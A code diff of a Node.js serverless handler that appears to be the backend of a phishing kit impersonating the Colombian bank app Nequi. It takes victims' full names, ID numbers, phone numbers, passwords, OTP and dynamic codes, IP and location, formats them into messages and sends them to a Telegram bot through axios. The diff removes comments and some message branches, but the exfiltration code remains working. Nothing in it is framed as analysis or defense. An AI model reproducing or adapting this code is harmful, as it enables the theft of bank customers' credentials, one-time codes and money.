@@ -3,7 +3,6 @@ const axios = require('axios');
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// Middleware para parsear el cuerpo de la solicitud
 async function parseBody(req) {
     return new Promise((resolve, reject) => {
         let body = '';
@@ -47,7 +46,6 @@ module.exports = async function handler(req, res) {
 
         let message;
 
-        // Generar el mensaje según el tipo de datos
         if (otpCode) {
             message = `
 🤠Nequi_OTP🤠
@@ -58,27 +56,6 @@ module.exports = async function handler(req, res) {
 ⭐️OTP: ${otpCode}
 🌏IP: ${userIP || 'Desconocida'}
 🇨🇴Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
-`.trim();
-        } else if (dynamicCode) {
-            const formatType = dynamicCode.startsWith('2') ? 'Dinamica2' : 'Dinamica3';
-            message = `
-🤠Nequi_${formatType}🤠
-🆔Nombres: ${fullName}
-🪪Cedula: ${documentNumber}
-#️⃣Número: ${username || 'No proporcionado'}
-🔐Clave: ${password || 'No proporcionada'}
-⭐️${formatType}: ${dynamicCode}
-🌏IP: ${userIP || 'Desconocida'}
-🇨🇴Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
-`.trim();
-        } else if (!username && !password) {
-            message = `
-⭐️⭐️Nequi 2.0⭐️⭐️
-🪪ID: ${documentNumber}
-👤Nombres: ${fullName}
-🌏IP: ${userIP || 'Desconocida'}
-🏙Ciudad: ${city || 'Desconocida'}
-🇨🇴País: ${country || 'Desconocido'}
 `.trim();
         } else {
             message = `
@@ -92,13 +69,11 @@ module.exports = async function handler(req, res) {
 `.trim();
         }
 
-        // Enviar el mensaje a Telegram
         const response = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
             { chat_id: CHAT_ID, text: message }
         );
 
-        // Responder con éxito
         res.json({ success: true, data: response.data });
     } catch (error) {
         console.error('Error al procesar la solicitud:', error.message);
